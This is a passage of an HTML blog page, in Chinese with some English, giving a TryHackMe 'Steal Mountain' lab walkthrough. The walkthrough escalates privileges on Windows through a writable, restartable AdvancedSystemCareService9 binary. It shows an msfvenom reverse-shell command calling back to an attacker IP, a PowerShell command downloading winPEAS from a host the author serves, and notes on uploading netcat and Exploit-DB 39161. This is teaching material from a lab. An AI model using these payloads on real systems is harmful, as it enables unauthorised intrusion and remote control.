+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061606715.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061606715.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061606715.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061606715.png"
+        title="image-20240306160639666" /></p>
+<p>拿到shell之后去dekstop找到user.txt，内容即为flag。</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>这里使用了一个powershell脚本https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1。（该脚本是一个基于poweshell的提权功能脚本，包含了很多功能，后续会出专门的文章对该工具的使用进行详解。）</p>
+<p>上传到目标机器，然后执行：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061621275.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061621275.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061621275.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061621275.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061621275.png"
+        title="image-20240306162134267" /></p>
+<p>然后启动powershell扩展：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061623871.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061623871.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061623871.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061623871.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061623871.png"
+        title="image-20240306162309830" /></p>
+<p>执行上传的脚本:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061625717.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061625717.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061625717.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061625717.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061625717.png"
+        title="image-20240306162547671" /></p>
+<h3 id="what-is-the-name-of-the-service-which-shows-up-as-an-unquoted-service-path-vulnerability">What is the name of the service which shows up as an <em>unquoted service path</em> vulnerability?</h3>
+<p>存在问题的服务的名称：AdvancedSystemCareService9</p>
+<h3 id="what-is-the-root-flag">What is the root flag?</h3>
+<p>The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program!</p>
+<p>Use msfvenom to generate a reverse shell as an Windows executable.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">msfvenom -p windows/shell_reverse_tcp LHOST=10.10.30.241 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Upload your binary and replace the legitimate one. Then restart the program to get a shell as root.</p>
+<p>本地生成payload之后，首先暂停掉目标服务AdvancedSystemCareService9，然后上传payload：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061638495.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061638495.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061638495.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061638495.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061638495.png"
+        title="image-20240306163834688" /></p>
+<p>本地监听端口，重新进入shell启动服务，拿到system权限：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061640530.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061640530.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061640530.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061640530.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061640530.png"
+        title="image-20240306164034475" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061641177.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061641177.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061641177.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061641177.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061641177.png"
+        title="image-20240306164152121" /></p>
+<h2 id="access-and-escalation-without-metasploit">Access and Escalation without Metasploit</h2>
+<p>不使用msf重新走一遍上面的流程。</p>
+<h3 id="1-下载exp">1. 下载exp</h3>
+<p>可以直接使用searchsploit中的，也可以下载https://www.exploit-db.com/raw/39161</p>
+<h3 id="2-修改portip">2. 修改port/ip</h3>
+<p>修改exp中的攻击机的ip和监听端口</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061705771.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061705771.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061705771.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061705771.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061705771.png"
+        title="image-20240306170537719" /></p>
+<h3 id="3-开启一个web-server上传一个netcatexe">3. 开启一个web server，上传一个netcat.exe</h3>
+<p>这个exp需要使用natcat.exe来发起一个连接请求，所以需要上传一个netcat.exe到目标机器。采用的方式是python开启一个web server，然后上传。默认使用80，如果要修改这个端口，就要在exp的vbs变量中的ip_addr的后面加上<code>:[port]</code>字符串。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061705497.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061705497.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061705497.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061705497.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061705497.png"
+        title="image-20240306170551447" /></p>
+<h3 id="4-开启web-server监听端口">4. 开启web server，监听端口</h3>
+<p>netcat.exe放在web server目录下，同时开启端口监听</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061707005.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061707005.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061707005.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061707005.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061707005.png"
+        title="image-20240306170752951" /></p>
+<h3 id="5-运行exp获取反弹shell">5. 运行exp，获取反弹shell</h3>
+<p>我这里通过VPN连接的kali怎么都弹不回来-。-不浪费时间了</p>
+<h3 id="6-使用winpeas">6. 使用winPEAS</h3>
+<p>下载winPEAS：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">powershell</span> <span class="n">-c</span> <span class="nb">wget </span><span class="s2">&#34;http://&lt;ip&gt;:8000/winPEAS.exe&#34;</span> <span class="n">-outfile</span> <span class="s2">&#34;winPEAS.exe&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061738870.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061738870.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061738870.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061738870.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061738870.png"
+        title="img" /></p>
+<h3 id="7-运行winpeas发现弱点">7. 运行winPEAS，发现弱点</h3>
+<p>运行winPEAS，找到存在漏洞的服务：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061739953.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061739953.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061739953.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061739953.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061739953.png"
+        title="img" /></p>
+<p>后续使用就是生成提权payload，stop服务，上传payload，替换exe，start服务，获得shell。</p>
+<h2 id="总结">总结</h2>
+<p>扫 -&gt; 找洞 -&gt; 打 -&gt; 提</p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2024-01-04</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="https://www.v4ler1an.com/2024/01/thm-steal_mountain/" data-title="TryHackMe -- Steal Mountain" data-via="@YaoyaoShaw" data-hashtags="THM"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="https://www.v4ler1an.com/2024/01/thm-steal_mountain/" data-hashtag="THM"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Hacker News" data-sharer="hackernews" data-url="https://www.v4ler1an.com/2024/01/thm-steal_mountain/" data-title="TryHackMe -- Steal Mountain"><i class="fab fa-hacker-news fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="https://www.v4ler1an.com/2024/01/thm-steal_mountain/" data-title="TryHackMe -- Steal Mountain"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@2.14.0/icons/line.svg"></i></a><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://www.v4ler1an.com/2024/01/thm-steal_mountain/" data-title="TryHackMe -- Steal Mountain"><i class="fab fa-weibo fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/thm/">THM</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2024/01/thm-kenobi/" class="prev" rel="prev" title="TryHackMe -- Kenobi"><i class="fas fa-angle-left fa-fw"></i>TryHackMe -- Kenobi</a>
+            <a href="/2024/01/cobalt_strike_basic_no.1/" class="next" rel="next" title="Cobalt Strike Basic No.1 -- Basic and Infrastructure Management">Cobalt Strike Basic No.1 -- Basic and Infrastructure Management<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="disqus_thread" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://disqus.com/?ref_noscript">Disqus</a>.
+            </noscript><div id="valine" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Something just like this.</div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2021 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://www.v4ler1an.com" target="_blank"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/valine/valine.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/css/lightgallery.min.css"><script type="text/javascript" src="https://.disqus.com/embed.js" defer></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.37.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.2.0/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/js/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-thumbnail.js@1.2.0/dist/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-zoom.js@1.2.0/dist/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.4.0/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{"valine":{"appId":"OGG2bwJUUrIOs4sAfU87yE6d-gzGzoHsz","appKey":"vOzsADf7YdkMoNXlgShAFepl","avatar":"mp","el":"#valine","emojiCDN":"https://cdn.jsdelivr.net/npm/emoji-datasource-google@5.0.1/img/google/64/","emojiMaps":{"100":"1f4af.png","alien":"1f47d.png","anger":"1f4a2.png","angry":"1f620.png","anguished":"1f627.png","astonished":"1f632.png","black_heart":"1f5a4.png","blue_heart":"1f499.png","blush":"1f60a.png","bomb":"1f4a3.png","boom":"1f4a5.png","broken_heart":"1f494.png","brown_heart":"1f90e.png","clown_face":"1f921.png","cold_face":"1f976.png","cold_sweat":"1f630.png","confounded":"1f616.png","confused":"1f615.png","cry":"1f622.png","crying_cat_face":"1f63f.png","cupid":"1f498.png","dash":"1f4a8.png","disappointed":"1f61e.png","disappointed_relieved":"1f625.png","dizzy":"1f4ab.png","dizzy_face":"1f635.png","drooling_face":"1f924.png","exploding_head":"1f92f.png","expressionless":"1f611.png","face_vomiting":"1f92e.png","face_with_cowboy_hat":"1f920.png","face_with_hand_over_mouth":"1f92d.png","face_with_head_bandage":"1f915.png","face_with_monocle":"1f9d0.png","face_with_raised_eyebrow":"1f928.png","face_with_rolling_eyes":"1f644.png","face_with_symbols_on_mouth":"1f92c.png","face_with_thermometer":"1f912.png","fearful":"1f628.png","flushed":"1f633.png","frowning":"1f626.png","ghost":"1f47b.png","gift_heart":"1f49d.png","green_heart":"1f49a.png","grimacing":"1f62c.png","grin":"1f601.png","grinning":"1f600.png","hankey":"1f4a9.png","hear_no_evil":"1f649.png","heart":"2764-fe0f.png","heart_decoration":"1f49f.png","heart_eyes":"1f60d.png","heart_eyes_cat":"1f63b.png","heartbeat":"1f493.png","heartpulse":"1f497.png","heavy_heart_exclamation_mark_ornament":"2763-fe0f.png","hole":"1f573-fe0f.png","hot_face":"1f975.png","hugging_face":"1f917.png","hushed":"1f62f.png","imp":"1f47f.png","innocent":"1f607.png","japanese_goblin":"1f47a.png","japanese_ogre":"1f479.png","joy":"1f602.png","joy_cat":"1f639.png","kiss":"1f48b.png","kissing":"1f617.png","kissing_cat":"1f63d.png","kissing_closed_eyes":"1f61a.png","kissing_heart":"1f618.png","kissing_smiling_eyes":"1f619.png","laughing":"1f606.png","left_speech_bubble":"1f5e8-fe0f.png","love_letter":"1f48c.png","lying_face":"1f925.png","mask":"1f637.png","money_mouth_face":"1f911.png","nauseated_face":"1f922.png","nerd_face":"1f913.png","neutral_face":"1f610.png","no_mouth":"1f636.png","open_mouth":"1f62e.png","orange_heart":"1f9e1.png","partying_face":"1f973.png","pensive":"1f614.png","persevere":"1f623.png","pleading_face":"1f97a.png","pouting_cat":"1f63e.png","purple_heart":"1f49c.png","rage":"1f621.png","relaxed":"263a-fe0f.png","relieved":"1f60c.png","revolving_hearts":"1f49e.png","right_anger_bubble":"1f5ef-fe0f.png","robot_face":"1f916.png","rolling_on_the_floor_laughing":"1f923.png","scream":"1f631.png","scream_cat":"1f640.png","see_no_evil":"1f648.png","shushing_face":"1f92b.png","skull":"1f480.png","skull_and_crossbones":"2620-fe0f.png","sleeping":"1f634.png","sleepy":"1f62a.png","slightly_frowning_face":"1f641.png","slightly_smiling_face":"1f642.png","smile":"1f604.png","smile_cat":"1f638.png","smiley":"1f603.png","smiley_cat":"1f63a.png","smiling_face_with_3_hearts":"1f970.png","smiling_imp":"1f608.png","smirk":"1f60f.png","smirk_cat":"1f63c.png","sneezing_face":"1f927.png","sob":"1f62d.png","space_invader":"1f47e.png","sparkling_heart":"1f496.png","speak_no_evil":"1f64a.png","speech_balloon":"1f4ac.png","star-struck":"1f929.png","stuck_out_tongue":"1f61b.png","stuck_out_tongue_closed_eyes":"1f61d.png","stuck_out_tongue_winking_eye":"1f61c.png","sunglasses":"1f60e.png","sweat":"1f613.png","sweat_drops":"1f4a6.png","sweat_smile":"1f605.png","thinking_face":"1f914.png","thought_balloon":"1f4ad.png","tired_face":"1f62b.png","triumph":"1f624.png","two_hearts":"1f495.png","unamused":"1f612.png","upside_down_face":"1f643.png","weary":"1f629.png","white_frowning_face":"2639-fe0f.png","white_heart":"1f90d.png","wink":"1f609.png","woozy_face":"1f974.png","worried":"1f61f.png","yawning_face":"1f971.png","yellow_heart":"1f49b.png","yum":"1f60b.png","zany_face":"1f92a.png","zipper_mouth_face":"1f910.png","zzz":"1f4a4.png"},"enableQQ":false,"highlight":true,"lang":"zh-cn","pageSize":10,"placeholder":"人世纷乱，出入平安。","recordIP":true,"visitor":true}},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.zh-cn","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
